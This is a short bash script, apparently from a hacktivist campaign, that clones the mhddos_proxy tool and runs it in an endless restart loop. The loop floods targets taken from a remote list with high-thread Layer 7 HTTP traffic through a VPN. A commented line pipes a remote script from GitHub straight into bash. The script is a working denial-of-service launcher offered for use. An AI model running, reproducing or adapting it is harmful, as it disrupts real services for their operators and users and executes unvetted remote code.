#!/bin/bash
#curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7_test.sh | bash
rm -rf mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
python3 -m pip install -r requirements.txt

while true
do
   pkill -f runner.py
   sleep 7
   python3 runner.py -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7.lst -t 800 --rpc 350 --http-methods GET STRESS --vpn --lang en --debug
sleep 9m
done
